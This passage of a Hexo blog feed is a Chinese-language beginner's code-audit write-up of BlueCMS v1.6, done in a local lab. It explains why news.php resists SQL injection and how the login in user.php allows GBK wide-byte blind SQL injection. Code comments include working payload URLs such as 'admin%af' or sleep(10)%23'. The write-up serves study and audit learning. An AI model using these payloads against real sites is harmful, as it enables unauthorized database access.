src="/2020/09/23/BlueCMS%E5%8A%9F%E8%83%BD%E7%82%B9%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91/Untitled.png" alt="Untitled.png (1699×376)" style="zoom:40%;">]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BlueCMS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计入门实战—BlueCMS</title>
      <link href="2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/"/>
      <url>2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/</url>
      
        <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这算是自己的第一个代码审计实战，无数次想开始代码审计之旅，但最终都不了了之，原因是一直没有找到合适自己的审计方法，严格来说应该是自己的基础能力不足以支撑自己的想法……</p><p>众所周知，代码审计的思路大致可以分为<code>通读全文代码</code>、<code>审计功能点</code>、<code>追踪数据流/追溯变量</code>、<code>寻找危险函数/变量</code>等。</p><p>在自己看来后两种方式是不太适合新手一开始就去采用的方法，因为感觉上并不能让自己对全局有很好的认识和掌握，这两种方法给自己感觉更多像是在很熟悉代码审计后投机取巧的方式。</p><p>可能是由于自己个性的原因，不喜欢”蒙在鼓里”的感觉，学习什么东西都想要弄清楚，自己心情才会感觉到通透，不准确的描述这种感觉：应该是一种凡事想要先了解大致全貌才能静下心去研究个点细节，这可能是浮躁性格导致的吧。因此初学阶段，自己其实一直想采用的方法是通读全文代码，但是该方法实际是需要建立在具备强大的开发能力的基础上的。准确来说，对自己而言不错的开发能力应该是语言的基础+开发的思维，语言的基础这点不用多说，实际上我觉得也不用一定要达到精通的地步，能大概知道代码的意思就行。而我觉得最重要的应该的开发的思维，不确定这样描述准不准确，但我觉得它包含例如设计模式、某个功能实现的思路等方方面面。</p><p>最近，又想重新开始学习代码审计，因为那种让自己感觉到不”通透”的，不仅只有代码审计而已，一直以来黑盒渗透测试就让自己很难受，因此实际上想学习代码审计就是为了解决这份不通透感。既然前面说的几种方法感觉都不太适合自己，一番总结思考后，感觉可以从审计功能点开始入门，不用通读全文但可以知道常见的一些功能后面的代码逻辑。</p><p>由于重复了“开始到放弃”很多次，这次总算是下定决心了，所以总结反思一下之前的失败的原因和自己的一些想法，算是为重新开始做个分界点，也为以后回顾此时此刻的想法是否是正解留个参考点。</p><p>以上。</p><h4 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h4><blockquote><p>PhpStudy集成环境 (PHP + MySQL + Xdebug )</p><p>PhpStorm</p><p>BlueCMS_v1.6_sp1 </p></blockquote><h2 id="新闻显示"><a href="#新闻显示" class="headerlink" title="新闻显示"></a>新闻显示</h2><img src="/2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/image-20200923105348921.png" alt="image-20200923105348921" style="zoom:50%;"><h5 id="SQL注入审计—结果为不存在漏洞"><a href="#SQL注入审计—结果为不存在漏洞" class="headerlink" title="SQL注入审计—结果为不存在漏洞"></a>SQL注入审计—结果为不存在漏洞</h5><p>新闻的内容页由<code>news.php</code>处理，每篇新闻由不同的文章<code>id</code>标识，根据不同的<code>id</code>从存放文章的数据表中查询获取数据，每篇新闻的URL形如：<code>news.php?id=x</code>。</p><p>审计<code>news.php</code>代码实现，由于会对获取的<code>id</code>参数使用<code>intval()</code>函数进行了处理，因此无法进行SQL注入。</p><pre class=" language-php"><code class="language-php"> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token comment" spellcheck="true">//获取文章id，可以看到对获取的ID使用intval()进行了处理，因此无法进行SQL注入。</span> <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_cached</span><span class="token punctuation">(</span><span class="token string">'news_list.htm'</span><span class="token punctuation">,</span> <span class="token variable">$cache_id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token comment" spellcheck="true">//根据文章ID进行数据库查询</span>        <span class="token variable">$news</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getone</span><span class="token punctuation">(</span><span class="token string">"SELECT id, title, color, author, source, pub_date, content, click, comment FROM "</span><span class="token punctuation">.</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'article'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>                <span class="token string">" WHERE id = "</span><span class="token punctuation">.</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//将查询到的文章数据传给模板进行渲染</span>        <span class="token function">template_assign</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'news'</span><span class="token punctuation">,</span> <span class="token string">'url'</span><span class="token punctuation">,</span> <span class="token string">'comment_list'</span><span class="token punctuation">,</span> <span class="token string">'user_name'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$news</span><span class="token punctuation">,</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$comment_lsit</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'user_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h6 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a><strong>Tips</strong></h6><blockquote><ol><li><code>news.php?id=1</code>与<code>news.php?id=1abc</code>返回页面一样，则很可能是使用了类似<code>intval()</code>函数将参数值转换为了整型。</li></ol></blockquote><h2 id="前台用户登录"><a href="#前台用户登录" class="headerlink" title="前台用户登录"></a>前台用户登录</h2><img src="/2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/image-20200923115547239.png" alt="image-20200923115547239" style="zoom:50%;"><h5 id="SQL注入审计—结果为存在SQL盲注（宽字符注入绕过转义）"><a href="#SQL注入审计—结果为存在SQL盲注（宽字符注入绕过转义）" class="headerlink" title="SQL注入审计—结果为存在SQL盲注（宽字符注入绕过转义）"></a>SQL注入审计—结果为存在SQL盲注（宽字符注入绕过转义）</h5><p>根据表单信息可以看到，由<code>user.php</code>文件负责进行登录验证，<code>act</code>为<code>index_login</code>（BlueCMS使用<code>act</code>参数来控制流程逻辑）。</p><p><strong>代码流程</strong></p><p>在对<code>user.php</code>文件进行审计之前，先大致分析一下前台登录时的代码流程。</p><p>首先会在<code>user.php</code>文件顶部看到包含了三个文件：</p><pre class=" language-php"><code class="language-php"> <span class="token keyword">require_once</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/include/common.inc.php'</span><span class="token punctuation">;</span> <span class="token keyword">require_once</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/include/filter.inc.php'</span><span class="token punctuation">;</span> <span class="token keyword">require_once</span> <span class="token constant">BLUE_ROOT</span><span class="token punctuation">.</span><span class="token string">'include/upload.class.php'</span><span class="token punctuation">;</span></code></pre><p>通过查看<code>common.inc.php</code>文件，发现其会对参数进行统一的转义过滤，例如<code>&#39;</code>、<code>&quot;</code>等特殊字符都会被添加<code>\</code>进行转义。</p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//若没开启魔术引号，则使用下列函数对参数进行过滤。</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">get_magic_quotes_gpc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$_POST</span> <span class="token operator">=</span> <span class="token function">deep_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$_GET</span> <span class="token operator">=</span> <span class="token function">deep_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$_COOKIES</span> <span class="token operator">=</span> <span class="token function">deep_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_COOKIES</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$_REQUEST</span> <span class="token operator">=</span> <span class="token function">deep_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>接着查看<code>filter.inc.php</code>文件，发现其也是一个用于过滤参数的，但是逻辑比较简单，只是根据配置文件的配置过滤替换特定的字符。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token keyword">as</span> <span class="token variable">$k1</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        $<span class="token variable">$k1</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$k1</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//对GET、POST提交的所有参数使用filter函数进行处理。</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>filter函数逻辑简单，就是根据配置文件中有无针对特定字符进行过滤的配置而进行匹配替换为<span class="token operator">*</span><span class="token operator">*</span>。故省略<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>接下来，会根据<code>act</code>参数值的不同进入到不同的逻辑代码块中，前台登录时<code>act=index_login</code>。</p><pre class=" language-php"><code class="language-php"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token variable">$act</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'act'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'act'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">'default'</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$act</span> <span class="token operator">==</span> <span class="token string">'index_login'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//获取用户名和密码参数值，并做去除两边空白处理。</span>     <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'user_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'user_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>     <span class="token variable">$pwd</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>     <span class="token variable">$remember</span> <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'remember'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'remember'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user_name</span> <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token function">showmsg</span><span class="token punctuation">(</span><span class="token string">'用户名不能为空'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$pwd</span> <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token function">showmsg</span><span class="token punctuation">(</span><span class="token string">'密码不能为空'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token comment" spellcheck="true">//SQL宽字符注入 + 盲注</span>    <span class="token comment" spellcheck="true">// http://bluecms.com/user.php?act=index_login&amp;user_name=admin%af' or sleep(0)%23 &amp;pwd=123</span>    <span class="token comment" spellcheck="true">//使用用户名到admin数据表中进行查询，确定用户是否属于管理员组。</span>    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getone</span><span class="token punctuation">(</span><span class="token string">"SELECT COUNT(*) AS num FROM "</span><span class="token punctuation">.</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">" WHERE admin_name='$user_name'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">showmsg</span><span class="token punctuation">(</span><span class="token string">'系统用户组不能从前台登录'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//用户名密码校验</span>    <span class="token variable">$w</span> <span class="token operator">=</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$user_name</span><span class="token punctuation">,</span> <span class="token variable">$pwd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$w</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> <span class="token variable">$w</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">showmsg</span><span class="token punctuation">(</span><span class="token string">'您输入的用户名和密码不正确'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$w</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">update_user_info</span><span class="token punctuation">(</span><span class="token variable">$user_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$remember</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'BLUE[user_id]'</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">172800</span><span class="token punctuation">,</span> <span class="token variable">$cookiepath</span><span class="token punctuation">,</span> <span class="token variable">$cookiedomain</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'BLUE[user_name]'</span><span class="token punctuation">,</span> <span class="token variable">$user_name</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">172800</span><span class="token punctuation">,</span> <span class="token variable">$cookiepath</span><span class="token punctuation">,</span> <span class="token variable">$cookiedomain</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'BLUE[user_pwd]'</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pwd</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$_CFG</span><span class="token punctuation">[</span><span class="token string">'cookie_hash'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">172800</span><span class="token punctuation">,</span> <span class="token variable">$cookiepath</span><span class="token punctuation">,</span> <span class="token variable">$cookiedomain</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token function">showmsg</span><span class="token punctuation">(</span><span class="token string">'欢迎您 '</span><span class="token punctuation">.</span><span class="token variable">$user_name</span><span class="token punctuation">.</span><span class="token string">' 回来，现在将转到会员中心'</span><span class="token punctuation">,</span> <span class="token string">'user.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span></code></pre><p>分析以上代码，可以看到登录验证使用函数<code>login()</code>，该函数在<code>user.func.php</code>文件中定义，该文件在<code>common.inc.php</code>文件中被包含导入。</p><pre class=" language-php"><code class="language-php"> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$user_name</span><span class="token punctuation">,</span><span class="token variable">$pwd</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">global</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//http://bluecms.com/user.php?act=index_login&amp;user_name=adm%af%27%20or%20sleep(10)%23%20&amp;pwd=123</span>    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getone</span><span class="token punctuation">(</span><span class="token string">"SELECT COUNT(*) AS num FROM "</span><span class="token punctuation">.</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">" WHERE user_name='$user_name'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT COUNT(*) AS num FROM "</span><span class="token punctuation">.</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">" WHERE user_name='$user_name' and pwd=md5('$pwd')"</span><span class="token punctuation">;</span>         <span class="token variable">$user_num</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getone</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user_num</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span> <span class="token punctuation">}</span></code></pre><p><strong>漏洞审计</strong></p><p>梳理好流程后，开始进行漏洞审计，通过前面的分析知道，提交的参数存在特殊字符的话都会被<code>addslashes()</code>函数进行转义处理，对于<code>字符型</code>的SQL语句我们在构造注入语句时就无法进行闭合。</p><img src="/2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/image-20200923152624634.png" alt="image-20200923152624634" style="zoom:50%;"><p>要进行SQL注入的话，就得必须绕过转义，可以考虑是否存在宽字节注入漏洞。</p><p>数据库连接代码在<code>mysql.class.php</code>中，核心代码如下，可以看到关键语句<code>SET NAMES gbk</code>，因此基本确定存在宽字符注入。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">mysql</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token variable">$linkid</span><span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$dbhost</span><span class="token punctuation">,</span> <span class="token variable">$dbuser</span><span class="token punctuation">,</span> <span class="token variable">$dbpw</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$dbcharset</span> <span class="token operator">=</span> <span class="token string">'gbk'</span><span class="token punctuation">,</span> <span class="token variable">$connect</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">mysql</span><span class="token punctuation">(</span><span class="token variable">$dbhost</span><span class="token punctuation">,</span> <span class="token variable">$dbuser</span><span class="token punctuation">,</span> <span class="token variable">$dbpw</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">,</span> <span class="token variable">$dbcharset</span><span class="token punctuation">,</span> <span class="token variable">$connect</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">mysql</span><span class="token punctuation">(</span><span class="token variable">$dbhost</span><span class="token punctuation">,</span> <span class="token variable">$dbuser</span><span class="token punctuation">,</span> <span class="token variable">$dbpw</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$dbcharset</span> <span class="token operator">=</span> <span class="token string">'gbk'</span><span class="token punctuation">,</span> <span class="token variable">$connect</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$connect</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">'mysql_pconnect'</span> <span class="token punctuation">:</span> <span class="token string">'mysql_connect'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">linkid</span> <span class="token operator">=</span> @<span class="token variable">$func</span><span class="token punctuation">(</span><span class="token variable">$dbhost</span><span class="token punctuation">,</span> <span class="token variable">$dbuser</span><span class="token punctuation">,</span> <span class="token variable">$dbpw</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">dbshow</span><span class="token punctuation">(</span><span class="token string">'Can not connect to Mysql!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">dbversion</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token string">'4.1'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">mysql_query</span><span class="token punctuation">(</span> <span class="token string">"SET NAMES gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">dbversion</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token string">'5.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string">"SET sql_mode = ''"</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">linkid</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token variable">$dbname</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">linkid</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">dbshow</span><span class="token punctuation">(</span><span class="token string">"Can't select MySQL database($dbname)!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>漏洞验证</strong></p><p>前面我们分析代码执行流程逻辑时，可以发现存在三次数据库查询，分别是下面的查询语句，可以任选其一进行注入。</p><pre class=" language-php"><code class="language-php"><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getone</span><span class="token punctuation">(</span><span class="token string">"SELECT COUNT(*) AS num FROM "</span><span class="token punctuation">.</span><span class="token function">table</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">" WHERE admin_name='$user_name'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span 